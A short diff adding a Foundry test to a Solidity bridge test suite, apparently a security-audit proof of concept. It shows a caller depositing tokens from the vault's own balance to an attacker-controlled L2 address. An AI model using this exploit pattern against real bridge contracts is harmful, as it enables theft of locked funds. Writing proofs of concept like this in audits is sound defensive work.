@@ -242,7 +242,16 @@ contract L1BossBridgeTest is Test {
 
     }
 
+    function testAnyoneCanTranferFromVault() public {
 
+        address attacker = makeAddr("attacker");
+        uint256 amount = 500 ether;
+        deal(address(token),address(vault),amount);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, amount);
+        tokenBridge.depositTokensToL2(address(vault), attacker, amount);
+
+    }
 
 
 }
